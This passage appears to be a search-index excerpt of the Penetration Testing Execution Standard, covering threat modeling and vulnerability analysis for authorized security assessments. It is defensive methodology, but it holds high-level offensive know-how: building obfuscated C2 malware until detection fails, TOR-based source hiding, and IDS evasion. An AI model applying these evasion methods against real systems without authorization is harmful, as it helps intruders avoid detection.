and even in a complete black-box situation where the tester does not have any prior information on the organization, the tester should create a threat model based on the attacker\u2019s view in combination with OSINT related to the target organization. The model should be clearly documented, and be delivered as part of the final report as the findings in the report will reference the threat model in order to create a more accurate relevance and risk score that is specific to the organization (rather than a generic technical one).","title":"General"},{"location":"pentest_standard/threatmodeling/#high-level-threat-modeling-process","text":"","title":"High level threat modeling process"},{"location":"pentest_standard/threatmodeling/#gather-relevant-documentation","text":"","title":"Gather relevant documentation"},{"location":"pentest_standard/threatmodeling/#identify-and-categorize-primary-and-secondary-assets","text":"","title":"Identify and categorize primary and secondary assets"},{"location":"pentest_standard/threatmodeling/#identify-and-categorize-threats-and-threat-communities","text":"","title":"Identify and categorize threats and threat communities"},{"location":"pentest_standard/threatmodeling/#map-threat-communities-against-primary-and-secondary-assets","text":"","title":"Map threat communities against primary and secondary assets"},{"location":"pentest_standard/threatmodeling/#example","text":"In the light of a PTES assessment the internally hosted CRM application may be in scope. The customer information stored in the back-end database is an easily identifiable primary asset as it is directly linked to the application in scope. However, by reviewing the technical design of the database server, it can also be identified that the HR database stored on the same back-end database server is a secondary asset. An attacker can use the CRM application as a stepping stone to obtain employee information. In a basic threat modeling exercise, certain threat communities may be identified as not relevant when mapped to the CRM application, but by identifying the secondary assets the threat landscape suddenly changes.","title":"Example"},{"location":"pentest_standard/threatmodeling/#high-level-modeling-tools","text":"There are a variety of tools available to identify targets and map attack vectors. These normally focus on the business assets (what systems to target) and business processes (how to attack them.) Depending on the engagement, the penetration testing team may perform these exercises with no input from the customer; or they may spend a lot of time with customer stakeholders identifying targets of interest. Tools with a business asset focus usually require a quantitative input to describe how important each potential target is to test. The inputs may also be qualitative, such as a description by the customer\u2019s CIO that a system is mission-critical. Tools focused on business processes, information flows and technical architecture are used to identify potential attack vectors and choose which are mostly likely to succed or most likely to be used by a certain class of adversary.","title":"High level modeling tools"},{"location":"pentest_standard/threatmodeling/#business-asset-analysis","text":"During the business asset analysis part of the threat modeling exercise an asset-centric view is taken on all assets, and business processes they support them, included in the scope. By analyzing the gathered documentation and interviewing relevant personnel within the organization, the pentester is able to identify the assets that are most likely to be targeted by an attacker, what their value is and what the impact of their (partial) loss would be.","title":"Business Asset Analysis"},{"location":"pentest_standard/threatmodeling/#organizational-data","text":"","title":"Organizational Data"},{"location":"pentest_standard/threatmodeling/#policies-plans-and-procedures","text":"Internal policies, plans, and procedures define how the organization does business. These documents are of particular interest as they can help identify key roles within an organization and critical business processes that keep a company running.","title":"Policies, Plans, and Procedures"},{"location":"pentest_standard/threatmodeling/#product-information-eg-trade-secrets-rd-data","text":"Product related information includes any patents, trade secrets, future plans, source code, supporting systems that directly affect the product market value, algorithms, and any other information that the organization regards as a key factor to the business success of such product.","title":"Product Information (e.g. trade secrets, R&amp;D data)"},{"location":"pentest_standard/threatmodeling/#marketing-information-plans-roadmaps-etc","text":"Marketing plans for promotions, launches, product changes, positioning, partnerships, 3 rd party providers, business plans related to activities inside or outside the organization. Additionally, PR related data such as details of partners, reporters, consulting firm, and any correspondence with such entities is also considered a highly sought after target.","title":"Marketing Information (plans, roadmaps, etc.)"},{"location":"pentest_standard/threatmodeling/#financial-information-eg-bank-credit-equity-accounts","text":"Financial information is often some of the most guarded information an organization possesses. This information can include bank account information, credit card account information and/or credit card numbers, and investment accounts, among others.","title":"Financial Information (e.g. bank, credit, equity accounts)"},{"location":"pentest_standard/threatmodeling/#technical-information","text":"Technical information about the organization, and the organization\u2019s operations, is of unique interest to the penetration tester. Such information is often not the expected deliverable of a penetration test, however, it facilitates the testing process by feeding valuable information to other areas; infrastructure design information may provide valuable data to the Intelligence Gathering process. * Infrastructure Design Information Infrastructure design related information pertains to all the core technologies and facilities used to run the organization. Building blueprints, technical wiring and connectivity diagrams, computing equipment/networking designs, and application level data processing are all considered infrastructure design information. * System Configuration Information System configuration information includes configuration baseline documentation, configuration checklists and hardening procedures, group policy information, operating system images, software inventories, etc. This information could aid the discovery of vulnerabilities (such as through the knowledge of configuration errors or outdated software installations). * User Account Credentials User account credentials help facilitate access to the information system, at a non-privileged level, as long as a means to authenticate exists (e.g. VPN, web portal, etc.). * Privileged User Account Credentials Privileged user account credentials help facilitate access to the information system, at an elevated level of access, as long as a means to authenticate exists (e.g. VPN, web portal, etc.). Obtaining privileged user account credentials often leads to compromise of the information system being tested.","title":"Technical Information"},{"location":"pentest_standard/threatmodeling/#employee-data","text":"Here employee data is being analyzed as any data that can have a DIRECT affect on the organization is obtained or compromised by an attacker. Organizations that have to adhere to some compliance which places fines on the loss or exposure of such data are obvious candidates for such a direct loss effect. Also, organizations who\u2019s employees may be considered critical assets may also be subjected to such scrutiny (specific government bodies, specialized trade secret related employees/departments, etc\u2026). The following list provides examples to information realms of personal data that may be considered business assets for the threat modeling. * National Identification Numbers (SSNs, etc.) * Personally Identifiable Information (PII) * Protected Health Information (PHI) * Financial Information (e.g. bank, credit accounts)","title":"Employee Data"},{"location":"pentest_standard/threatmodeling/#customer-data","text":"Much like employee data, customer data is considered a business asset in the threat modeling process when such information will incur a direct/indirect loss to the organization. On top of regulatory/compliance need (based on fines), an additional factor comes into play here when such data can be used to conduct fraud, where the organization may be held liable or sued for the losses related to the fraud (based on losing the customer information that enabled the fraud to take place). The following list provides examples of such information realms that may hold relevant customer data and should be considered business assets for the sake of the threat modeling * National Identification Numbers (SSN\u2019s, etc.) * Personally Identifiable Information (PII) * Protected Health Information (PHI) * Financial Accounts (e.g. bank, credit, equity accounts) * Supplier Data Information related to suppliers that is considered critical to the organization (such as critical component manufacturers, agreements with suppliers that may be part of a trade secret, cost analysis of supplied components), as well as any data that may be used to affect the business operations of the organization through its suppliers is considered a business asset. * Partner Data * \u201cCloud\u201d Service Account Information","title":"Customer Data"},{"location":"pentest_standard/threatmodeling/#human-assets","text":"When identifying human assets in an organization, we have to remember that the context is having such assets part of a greater effort to compromise the organization. As such, human assets that are identified as business assets are those that could be leveraged to divulge information, manipulated to make decisions or actions that would adversely affect the organization or enable an attacker to further compromise it. Human assets are not necessarily the highest up within the corporate hierarchy, but are more often key personnel that are related to previously identified business assets, or are in positions to enable access to such assets. This list can also include employees that normally would not be associated with access to restricted company assets, but may be in a position to grant physical access to a company that facilitates a breach of security or procedure. The following list provides some examples of such assets, and should be adapted to the organization being tested. * Executive Management * Executive Assistants * Middle Management * Administrative Assistants * Technical/Team Leads * Engineers * Technicians * Human Resources","title":"Human Assets"},{"location":"pentest_standard/threatmodeling/#business-process-analysis","text":"A business isn't a business if it doesn't make money. The way this happens is by having either raw goods or knowledge run through various processes to enhance them and create added value. This generates revenue. Business processes and the assets (people, technology, money) supporting them form value chains. By mapping these processes, identifying the critical vs. non-critical processes and eventually finding flaws in them we are able to understand how the business works, what makes them money and eventually how specific threat communities can make them lose money. In the business process analysis we differentiate between critical business processes, and non-critical processes. For each category the analysis is the same, and takes into account the same elements. The main difference is in the weighting that the threat from a critical business process is assigned with as opposed to a non-critical one. Nevertheless, it's imperative to remember that an aggregation of a few non-critical business processes can be combined into a scenario that essentially forms a critical flaw within an element/process. Such threat scenarios should also be identified within this phase and mapped out for later use in the penetration test.","title":"Business Process Analysis"},{"location":"pentest_standard/threatmodeling/#technical-infrastructure-supporting-process","text":"As business processes are usually supported by IT infrastructure (such as computer networks, processing power, PCs for entering information and managing the business process, etc...), all those elements must be identified and mapped. Such mapping should be clear enough to be used later on in the process when translating the threat model to the vulnerability mapping and exploitation.","title":"Technical infrastructure supporting process"},{"location":"pentest_standard/threatmodeling/#information-assets-supporting-process","text":"Contrary to technical infrastructure, information assets are existing knowledge bases in the organization that are used as either a reference, or as support material (decision making, legal, marketing, etc...). Such assets are usually identified in the business process already, and should be mapped alongside the technical infrastructure, as well as any additional technical infrastructure that supports the information assets themselves.","title":"Information assets supporting process"},{"location":"pentest_standard/threatmodeling/#human-assets-supporting-process","text":"Identification of the HR that are involved in the business process should be made in conjunction with the process analysis itself (whether documented or not), and every person that has any kind of involvement (even if it does not relate to a specific information asset or a technical infrastructure element) should be documented and mapped in the process. Such HR assets are usually part of an approval sub-process, a verification sub-process, or even a reference (such as legal advice). These kinds of assets (especially ones that have no relation to information assets or technical infrastructure) would be later mapped to attack vectors that are more social than technical in nature.","title":"Human assets supporting process"},{"location":"pentest_standard/threatmodeling/#3rd-party-integration-andor-usage-ofby-process","text":"Similar to human assets supporting the process, any 3 rd party that has any involvement with the business process should be mapped as well. This category can be tricky to map out, as it could contain both human assets, as well as information/technical ones (such as a SaaS provider).","title":"3rd party integration and/or usage of/by process"},{"location":"pentest_standard/threatmodeling/#threat-agentscommunity-analysis","text":"When defining the relevant threat communities and agents, a clear identification of the threat should be provided in terms of location (internal / external to the organization), the specific community within the location, and any additional relevant information that would assist in establishing a capabilities/motivation profile for the specific agent/community. Where possible, specific agents should be identified. Otherwise, a more general community should be outlined, along-with any supporting material and intelligence. Some examples of threat agent/community classifications are: {| class#\"wikitable\" |- ! Internal ! External |- | Employees | Business Partners |- | Management (executive, middle) | Competitors |- | Administrators (network, system, server) | Contractors |- | Developers | Suppliers |- | Engineers | Nation States |- | Technicians | Organized Crime |- | Contractors (with their external users) | Hacktivists |- | General user community | Script Kiddies (recreational/random hacking) |- | Remote Support | |}","title":"Threat Agents/Community Analysis"},{"location":"pentest_standard/threatmodeling/#employees","text":"Persons working directly for the company under a part-time or full-time contract. In general they are not regarded as posing a severe threat as most of them are relying on the company to make a living and, assuming they are treated well, are inclined to protect the company rather than to hurt it. Oftentimes involved in data loss incidents or accidental compromise. In rare cases they may be motivated by outsiders to assist in intrusions or they may engage in malicious acts on their own (e.g. rogue traders). While the skill level may vary, it is usually low to medium.","title":"Employees"},{"location":"pentest_standard/threatmodeling/#management-executive-middle","text":"Employees working directly for the company as described above. Given their position and function within the company they oftentimes have access to privileged information and may","title":"Management (Executive, middle)"},{"location":"pentest_standard/threatmodeling/#threat-capability-analysis","text":"Once a threat community has been identified, the capabilities of said community must also be analyzed in order to build an accurate threat model that reflects the actual probability of such a community/agent to successfully act upon the organization and compromise it. This analysis requires both a technical analysis as well as an opportunity analysis (where applicable).","title":"Threat Capability Analysis"},{"location":"pentest_standard/threatmodeling/#analysis-of-tools-in-use","text":"Any tools that are known to be available to the threat community/agent are to be included here. Additionally, tools that may be freely available should be analyzed for the required skill level needed to be able to utilize them to their potential, and mapped in the threat capability.","title":"Analysis of tools in use"},{"location":"pentest_standard/threatmodeling/#availability-to-relevant-exploitspayloads","text":"The threat community/agent should be analyzed in terms of its capability to either obtain or develop exploits for the environment relevant to the organization. Additionally, accessibility to such exploits/payloads through 3 rd parties, business partners, or underground communities should also be to taken into account in this analysis.","title":"Availability to relevant exploits/payloads"},{"location":"pentest_standard/threatmodeling/#communication-mechanisms","text":"An analysis of communication mechanisms available to the threat agent/community should be made to evaluate the complexity of attacks against an organization. These communication mechanisms range from simple and openly available technologies such as encryption, through to specialist tools and services such as bulletproof hosting, use of drop-sites, and the use of known or unknown botnets to perform attacks or mask source information. For example, as part of testing we test to see what the overall attack surface for an organization is from the outside. However, there is another whole component that is often times missed. What types of threats can exist post exploitation? This falls under the context of detecting exfiltration channels. Coincidentally, penetration testers are uniquely situated to test an organizations capability to detect command and control channels of today's modern malware. When this is in scope, we recommend the tester create a series of malware specimens that increase the level of obfuscation used to hide C2. The goal is to create malware that is easily detected, then increase the obfuscation to the point where detection no longer occurs.","title":"Communication mechanisms"},{"location":"pentest_standard/threatmodeling/#accessibility","text":"The final element in the threat actor capability analysis is their accessibility to the organization and/or the specific assets in question. Completing the profile depicted above while factoring in accessibility analysis would enable the penetration test to create clear scenarios that are relevant to the organization\u2019s risk.","title":"Accessibility"},{"location":"pentest_standard/threatmodeling/#motivation-modeling","text":"The possible motivation of threat agents/communities should be noted for further analysis. Motivations of attackers are constantly changing, as can be seen by the increase in hacktivism branded attacks by groups such as Anonymous and Antisec. There will be subtle differences in unique motivations based on each organization and/or vertical market, some common motivations include : * Profit (direct or indirect) * Hacktivism * Direct grudge * Fun / Reputation * Further access to partner/connected systems","title":"Motivation Modeling"},{"location":"pentest_standard/threatmodeling/#finding-relevant-news-of-comparable-organizations-being-compromised","text":"In order to provide a complete threat model, a comparison to other organizations within the same industry vertical should be provided. This comparison should include any relevant incidents or news related to such organizations and the challenges they face. Such a comparison is used to validate the threat model and offer a baseline for the organization to compare itself to (taking into account that this publicly available information only represents a portion of the actual threats and incidents the compared organization actually face).","title":"Finding relevant news of comparable Organizations being compromised"},{"location":"pentest_standard/vulnterability/","text":"Testing Vulnerability testing is the process of discovering flaws in systems and applications which can be leveraged by an attacker. These flaws can range anywhere from host and service misconfiguration, or insecure application design. Although the process used to look for flaws varies and is highly dependent on the particular component being tested, some key principals apply to the process. When conducting vulnerability analysis of any type the tester should properly scope the testing for applicable depth and breadth to meet the goals and/or requirements of the desired outcome. Depth values can include such things as the location of an assessment tool, authentication requirements, etc. For example; in some cases it maybe the goal of the test to validate mitigation is in place and working and the vulnerability is not accessible; while in other instances the goal maybe to test every applicable variable with authenticated access in an effort to discover all applicable vulnerabilities. Whatever your scope, the testing should be tailored to meet the depth requirements to reach your goals. Depth of testing should always be validated to ensure the results of the assessment meet the expectation (i.e. did all the machines authenticate, etc.). In addition to depth, breadth must also be taken into consideration when conducting vulnerability testing. Breadth values can include things such as target networks, segments, hosts, application, inventories, etc. At its simplest element, your testing may be to find all the vulnerabilities on a host system; while in other instances you may need to find all the vulnerabilities on hosts with in a given inventory or boundary. Additionally breadth of testing should always be validated to ensure you have met your testing scope (i.e. was every machine in the inventory alive at the time of scanning? If not, why). Active Active testing involves direct interaction with the component being tested for security vulnerabilities. This could be low level components such as the TCP stack on a network device, or it could be components higher up on the stack such as the web based interface used to administer such a device. There are two distinct ways to interact with the target component: automated, and manual. '''Automated''' Automated testing utilizes software to interact with a target, examine responses, and determine whether a vulnerability exists based on those responses. An automated process can help reduce time and labor requirements. For example, while it is simple to connect to a single TCP port on a system to determine whether it is open to receive incoming data, performing this step once for each of the available 65,535 possible ports requires a significant amount of time if done manually. When such a test must be repeated on multiple network addresses, the time required may simply be too great to allow testing to be completed without some form of automation. Using software to perform these functions allows the tester to accomplish the task at hand, and focus their attention on processing data and performing tasks which are better suited to manual testing. '''Network/General Vulnerability Scanners''' ''Port Based'' An automated port based scan is generally one of the first steps in a traditional penetration test because it helps obtain a basic overview of what may be available on the target network or host. Port based scanners check to determine whether a port on a remote host is able to receive a connection. Generally, this will involve the protocols which utilize IP (such as TCP, UDP, ICMP, etc.), However, ports on other network protocols could be present as well dependent on the environment (for example, it\u2019s quite common in large mainframe environments for SNA to be in use). Typically, a port can have one of two possible states: Open - the port is able to receive data Closed - the port is not able to receive data A scanner may list other states, such as \u201cfiltered\u201d, if it is unable to accurately determine whether a given port is open or closed. When the scanner determines that a port is open, a presumption is made by the scanner as to whether a vulnerability is present or not. For example, if a port based scanner connects to TCP port 23, and that port is listening, the scanner is likely to report that the telnet service is available on the remote host, and flag it as having a clear text authentication protocol enabled. '''Service Based''' A service based vulnerability scanner is one which utilizes specific protocols to communicate with open ports on a remote host, to determine more about the service that is running on that port. This is more precise than a port scan, because it does not rely on the port alone to determine what service is running. For example, a port scan may be able to identify that TCP port 8000 is open on a host, but it will not know based on that information alone what service is running there. A service scanner would attempt to communicate with the port using different protocols. If the service running on port 8000 is able to correctly communicate using HTTP, then it will be identified as a web server. '''Banner Grabbing''' Banner grabbing is the process of connecting to a specific port and examining data returned from the remote host to identify the service/application bound to that port. Often in the connection process, software will provide an identification string which may include information such as the name of the application, or information about which specific version of the software is running. '''Web Application Scanners''' '''General application flaw scanners''' Most web application scans start with the address of a website, web application, or web service. The scanner then crawls the site by following links and directory structures. After compiling a list of webpages, file_suport, services and/or other media offered, the scanner will perform tests, or audits against the results of the crawl. For example, if a webpage discovered in the crawl has form fields, the scanner might attempt SQL injection or cross-site scripting. If the crawled page contained errors, the scanner might look for sensitive information displayed in the error detail, and so on. It should be noted that crawling and testing phases can be staggered and performed at the same time to reduce overall scanning time. This is the default behavior for many web application scanners. '''Directory Listing/Brute Forcing''' Suppose there are directories available on the website that the crawler won\u2019t find by following links. Without prior knowledge of these directories, provided by the user, the scanner has at least two additional options. The scanner/crawler can search for \u201ccommon\u201d directories. These are directories with names and variants of names that are commonly found, and are included in a list that has been compiled as the result of years of experience and scanning. Most web applications have a \u201cbuilt-in\u201d list of this sort, while some penetration testers maintain their own custom lists. Sometimes directory names are unique enough that they can be used to identify a 3 rd party web application with reasonably high accuracy. An accurate directory list can often be the key to finding the \u201cadministrative\u201d portion of a website - a portion most penetration testers should be highly interested in discovering. Brute forcing directories is a similar approach, though instead of using a static list, a tool is used to enumerate every possibility a directory name could have. The downside of using this approach is that it has the potential to crash or inundate the web server with requests and thus cause a denial-of-service condition. Care should be taken to perform directory brute forcing while someone is keeping a close watch on the condition of the web server, especially in a production setting. The reason you as the penetration tester would want to perform directory listing is to extend your attack field or to find directories that could contain sensitive information (which depending on the goal of the penetration test, may lead to a major finding within it). '''Web Server Version/Vulnerability Identification''' Many web application scanners will attempt to compare the version of the web server with known vulnerable versions in security advisories. This approach can sometimes lead to false positives; as there are some cases where open-source web servers are forked or copied and given new names, banners, and assigned different version numbers. Additional steps should be taken to verify that the web server is, in fact, running what the banner, or web scanner reports. ''Methods'' Several web server methods are considered insecure, and can allow attackers to gain varying levels of access to web server content. The fact that these methods are part of the web server software, and not web site content differentiates it from other vulnerabilities discussed thus far. Some insecure methods include: OPTIONS While the HTTP OPTIONS method is not insecure by itself, it can allow an attacker to easily enumerate the kinds of HTTP methods accepted by the target server. Note, the OPTIONS method is not always accurate and each of the methods below should be validated individually. PUT/DELETE Using the PUT method, an attacker can upload malicious content such as HTML pages that could be used to transfer information, alter web content or install malicious software on the web server. Using the DELETE method an attacker could remove content or deface a site causing a disruption of service. Additionally, modern REST applications use PUT in a different manner: Create->POST Read->GET Update->PUT Delete->DELETE WebDAV WebDAV is a component of the Microsoft Internet Information Server (IIS). WebDAV stands for \u201cWeb-based Distributed Authoring and Versioning\u201d and is used for editing and file management. WebDAV extensions are used by administrators to manage and edit Web content remotely on IIS Web servers and can include PROPFIND, COPY, MOVE, PROPPATCH, MKCOL, LOCK, and UNLOCK .WebDAV interacts with core operating system components, which can expose a system to several possible vulnerabilities. Some of these potential risks include: Buffer overflow conditions due to improper handling of user requests Denial-of-service conditions from malformed requests Domain based scripting attacks Privilege escalation Execution of arbitrary code TRACE/TRACK Modern web servers support the TRACE HTTP method, which contains a flaw that can lead to unauthorized information disclosure. The TRACE method is used to debug web server connections and can allow the client to see what is being received at the other end of the request chain. Enabled by default in all major web servers, a remote attacker may abuse the HTTP TRACE functionality to disclose sensitive information resulting in a loss of confidentiality. '''Network Vulnerability Scanners/Specific Protocols''' '''VPN''' Conventional vulnerability assessment tools are not capable of performing the correct protocol negotiations with VPN devices that service Internet Key Exchange (IKE). In situations where IKE is in use, it will be necessary to use additional toolkits that can perform functions such as accurate fingerprinting, back off patterns and identify authentication mechanisms that are in use. By identifying these attributes of a VPN device, weaknesses can be identified in running code versions as well as authentication types such as static preshared keys. '''Voice Network Scanners''' ''War Dialing'' Many organizations still utilize out of band access over telephone lines. Using vulnerability assessment tools that are designed to conduct war-dialing can determine weaknesses in authentication and network architecture. ''VoIP'' Voice over IP technologies are now abundant within most organizations. Many tools have been developed to conduct vulnerability analysis of VoIP infrastructures. Using these tools, one can identify if VoIP networks are properly segmented and potentials for leveraging these networks to access core infrastructure systems or record phone conversations on a target network may exist. '''Manual Direct Connections''' As with any automated process or technology, the margin for error always exists. Instabilities in systems, network devices and network connectivity may introduce inaccurate results during testing. It is always recommended to execute manual direct connections to each protocol or service available on a target system to validate the results of automated testing as well as identifying all potential attack vectors and previously unidentified weaknesses. '''Obfuscated''' ''Multiple Exit Nodes'' Security monitoring and defense systems operate under the pretense of identifying malicious activity from a specific IP address. In situations where Intrusion Detection systems are deployed and monitoring activity, sourcing assessment and attack activities from multiple IP addresses provide more accurate results and lessen the opportunity for a monitoring device on a target network to identify and respond. Technologies such as TOR proxies can provide a means to conduct assessment activities without sourcing from a single IP address. ''IDS Evasion'' When conducting assessment activities against a target environment where IDS technologies are deployed, it may be necessary to perform evasion. Using methods such as string manipulation, polymorphism, session splicing, and fragmentation can provide more accurate results while bypassing signature matching patterns implemented in IDS devices. Passive '''Metadata Analysis''' Metadata analysis involves looking at data that describes a file, as opposed to the file data itself. A Microsoft Office document for example, might list the document author, company, when the document was last saved, when the document was created, and so on. Many documents even allow for the entry of custom metadata. This could potentially contain internal addresses and paths to servers, internal IP addresses, and other information a penetration tester could use to gain additional access or information. Though metadata is quite common on documents located on a company\u2019s internal network, companies should take care to purge metadata before making documents available to the public, or on the public Internet. For this reason, any metadata an attacker could gain access to passively (without directly attacking the target) should be considered a security issue. '''Traffic Monitoring''' Traffic monitoring is the concept of connecting to an internal network and capturing data for offline analysis. Route poisoning is excluded from this phase as these create \u201cnoise\u201d on the network and can easily be detected. It is often surprising how much sensitive data can be gleaned from a \u201cswitched\u201d network. This \u201cleaking of data\u201d onto a switched network can be categorized as follows: ARP/MAC cache overflow, causing switched packets to be broadcast - this is common on Cisco switches that have improper ARP/MAC cache timing configurations. Etherleak - some older network drivers and some embedded drivers will use data from system memory to pad ARP packets. If enough ARP packets can be collected, sensitive information from internal memory can be captured Misconfigured clusters or load balancers Hubs plugged into the network Note that some of these categories only result in data leakage to a single subnet, while others can result in leakage to much larger network segments. Validation '''Correlation between Tools''' When working with multiple tools the need for correlation of findings can become complicated. Correlation can be broken down into two distinct styles, specific and categorical correlation of items, both are useful based on the type of information, metrics and statistics you are trying to gather on a given target. Specific correlation relates to a specific definable issue such as vulnerability ID, CVE, OSVDB, vendor indexing numbers, known issue with a software product, etc. and can be grouped with micro factors such as hostname, IP, FQDN, MAC Address etc. An example of this would be grouping the findings for host x by CVE number as they would index the same issue in multiple tools. Categorical correlation relates to a categorical structure for issues such as in compliance frameworks (i.e. NIST SP 800-53, DoD 5300 Series, PCI, HIPPA, OWASP List, etc.) that allow you to group items by macro factors such as vulnerability types, configuration issues, etc. An example of this would be grouping all the findings for hosts with default passwords into a group for password complexity within NIST 800-53 (IA-5). In most cases penetration testers are going to focus on the micro issues of specific vulnerabilities found in redundancy between multiple tools on the same host. This redundancy can skew the statistical results in the test output leading to a false increased risk profile. The inverse of this is with an over reduction or simplification in macro correlation (i.e. top 10/20 lists) as the results can skew the output resulting in a false reduced risk profile. '''Manual Testing/Protocol Specific''' '''VPN''' ''Fingerprinting'' Fingerprinting is useful to determine the type of VPN device and correct version of code released installed. By accurately fingerprinting the device, proper research and analysis can then be conducted against the target system. ''Authentication'' VPN devices can operate with various forms of authentication. Using VPN toolkits that are not part of conventional vulnerability assessment tools allow for proper identification of the authentication mechanisms and determine weaknesses that may exist such as pre-shared keys or default group IDs. '''Citrix''' ''Enumeration'' Many default installations and poorly configured Citrix appliances provide a means to enumerate published applications and determine valid usernames that are configured to authenticate to the device. This information becomes crucial during brute force attacks and attempts to break out of predefined profiles for authorized users. '''DNS''' Domain Name Systems can offer an abundance of information to an attacker when they are not properly hardened. Version information allow for proper identification and accurate research analysis. Weaknesses such as zone transfers provide an exhaustive list of additional targets for attack as well as information leakage of potentially sensitive data pertaining to the target organization. '''Web''' Web services provide a large landscape for an attacker. Unlike most other protocols and services, web services are often found running on multiple ports of a single system. Administrators may focus their hardening on the common ports for web services or published directories and neglect to properly harden additional attributes. Web services should always be reviewed in a manual fashion as automated assessment tools are not capable of identifying most weaknesses in their services. '''Mail''' Mail servers can provide an abundance of information about a target organization. Using inherent functions in the target device, confirmation of valid accounts can be conducted as well as developing a list of potential usernames for additional attacks on other systems. Vulnerabilities such as mail relaying can be leveraged for additional attacks on the organization such as phishing. Often, mail servers will provide a web interface for remote access that can be targeted in brute force campaigns. '''Attack Avenues''' '''Creation of attack trees''' During a security assessment, it is crucial to the accuracy of the final report to develop an attack tree as testing progresses throughout the engagement. As new systems, services and potential vulnerabilities are identified; an attack tree should be developed and regularly updated. This is especially important during the exploitation phases of the engagement as one point of entry that materializes could be repeated across other vectors mapped out during the development of the attack tree. '''Isolated Lab Testing''' The accuracy of vulnerability analysis and exploitation is substantially greater when replicated environments are setup in an isolated lab. Often times, systems may be hardened with specific control sets or additional protection mechanisms. By designing a lab that mimics that of the target organization, the consultant can ensure that the vulnerabilities identified and exploits attempted against the desired targets are reliable and lessen the opportunity for inaccurate results or system inoperability. '''Visual Confirmation''' ''Manual Connection with Review'' While proper correlation can help reduce false findings and increase overall accuracy, there is no substitute for visually inspecting a target system. Assessment tools are designed to review the results of a protocol/service connection or the response and compare to known signatures of vulnerabilities. However, tools are not always accurate in identifying services on uncommon ports or custom logic that may be built into an application. By manually assessing a target system, its services available and the applications that provide functionality for those services, a tester can ensure that proper validation and vulnerability identification have been completed. Research '''Public Research''' Once a vulnerability has been reported in a target system, it is necessary to determine the accuracy of the identification of the issue, and to research the potential exploitability of the vulnerability within the scope of the penetration test. In many cases, the vulnerability will be a reported software vulnerability in a commercial or open source software package, and in other cases the vulnerability can be a flaw in a business process, or a common administrative error like misconfiguration or default password usage. ''Vulnerability Databases'' Vulnerability databases can be used to verify an issue reported by an automated tool, or to manually review the vulnerability of a target application. Most tools will use the CVE identifier for a given vulnerability, which can be used to access the summary information and links to other sources in the CVE database. The CVE can also be used to search for the issue in vulnerability databases like OSVDB and Bugtraq, or in exploit databases and frameworks. Vulnerability databases should be used to verify the accuracy of a reported issue. For example, an Apache web server flaw can exist on Windows, but not on Linux, which may not be taken into account by an automated scanner. ''Vendor Advisories'' Vendor-issued security advisories and change logs can provide pointers to vulnerability information that may not be reported by any automated tools. Many major software vendors report limited details on internally discovered issues and issues where an independent researcher coordinates the disclosure of a vulnerability. If the researcher chooses to remain silent on the details of the vulnerability, the vendor advisory is frequently the only data available. In these cases, other researchers may discover more details independently, and add the details to vulnerability databases. Searching for the CVE used in a vendor advisory may turn up more detail on a potentially exploitable issue. Change logs can provide guidance for additional research, especially in open source products, where a diff between versions can reveal a vulnerability which was fixed but not widely known, and perhaps not prioritized for upgrade or installation as a result. '''Exploit Databases and Framework Modules''' Many exploit databases are actively maintained and publicly accessible on the Internet. Security researchers and exploit writers do not always submit their exploit code to multiple sites, so it is advisable to become familiar with several sites, and check each one for exploit code to use against potentially vulnerable applications. While some vulnerability databases track exploit availability, their coverage is usually incomplete and should not be considered exhaustive. Commercial and open source exploit frameworks can also prove useful in researching vulnerabilities. In most cases, available exploit modules are listed on their public web sites, and can be a valuable indication of the exploitability of an issue. '''Common/default Passwords''' Frequently, administrators and technicians choose weak passwords, never change the default or do not set any password at all. Manuals for most software and hardware can be easily found online, and will provide the default credentials. Internet forums and official vendor mailing lists can provide information on undocumented accounts, commonly-used passwords and frequently misconfigured accounts. Finally, many web sites document default/backdoor passwords and should be checked for every identified system. '''Hardening Guides/Common Misconfigurations''' One of the primary goals of penetration testing is to simulate the tactics and behavior of an actual attacker. While automated scanning can reduce the time window of a test, no scanner can behave like a human being. Hardening guides can be an invaluable reference for a penetration tester. They not only highlight the weakest parts of a system, but you can gain a sense of the diligence of an administrator by validating how many recommendations have been implemented. During every penetration test, time should be taken to review every major system and its recommended hardening settings, in order to discover vulnerabilities left in place by the administrator. User forums and mailing lists can provide valuable information about systems and the various issues administrators have in configuring and securing them. A tester should research target systems as if he were installing one himself, and discover where the pain points and probable configuration errors will lie. '''Private Research''' ''Setting up a replica environment'' Virtualization technologies allow a security researcher to run a wide variety of operating systems and applications, without requiring dedicated hardware. When a target operating system or application has been identified, a virtual machine (VM) environment can be quickly created to mimic the target. The tester can use this VM to explore to configuration parameters and behaviors of the application, without directly connecting to the target. ''Testing Configurations'' A testing VM lab should contain base images for all common operating systems, including Windows XP, Vista, 7, Server 2003 and Server 2008, Debian, Ubuntu, Red Hat and Mac OS X, where possible. Maintaining separate images for each service pack level will streamline the process of recreating the target\u2019s environment. A complete VM library in combination with a VM environment that supports cloning will allow a tester to bring up a new target VM in minutes. Additionally, using a snapshot feature will allow to work more efficiently and to reproduce bugs. ''Fuzzing'' Fuzzing, or fault injection, is a brute-force technique for finding application flaws by programmatically submitting valid, random or unexpected input to the application. The basic process involves attaching a debugger to the target application, and then running the fuzzing routine against specific areas of input and then analyzing the program state following any crashes. Many fuzzing applications are available, although some testers write their own fuzzers for specific targets. '''Identifying potential avenues/vectors''' Log in or connect to a target network application to identify commands and other areas of input. If the target is a desktop application that reads files and/or web pages, analyze the accepted file formats for avenues of data input. Some simple tests involve submitting invalid characters, or very long strings of characters to cause a crash. Attach a debugger to analyze the program state in the event of a successful crash. '''Disassembly and code analysis''' Some programming languages allow for decompilation, and some specific applications are compiled with symbols for debugging. A tester can take advantage of these features to analyze program flow and identify potential vulnerabilities. Source code for open source applications should be analyzed for flaws. Web applications written in PHP share many of the same vulnerabilities, and their source code should be examined as part of any test.","title":"Vulnerability Analysis"},{"location":"pentest_standard/vulnterability/#testing","text":"Vulnerability testing is the process of discovering flaws in systems and applications which can be leveraged by an attacker. These flaws can range anywhere from host and service misconfiguration, or insecure application design. Although the process used to look for flaws varies and is highly dependent on the particular component being tested, some key principals apply to the process. When conducting vulnerability analysis of any type the tester should properly scope the testing for applicable depth and breadth to meet the goals and/or requirements of the desired outcome. Depth values can include such things as the location of an assessment tool, authentication requirements, etc. For example; in some cases it maybe the goal of the test to validate mitigation is in place and working and the vulnerability is not accessible; while in other instances the goal maybe to test every applicable variable with authenticated access in an effort to discover all applicable vulnerabilities. Whatever your scope, the testing should be tailored to meet the depth requirements to reach your goals. Depth of testing should always be validated to ensure the results of the assessment meet the expectation (i.e. did all the machines authenticate, etc.). In addition to depth, breadth must also be taken into consideration when conducting vulnerability testing. 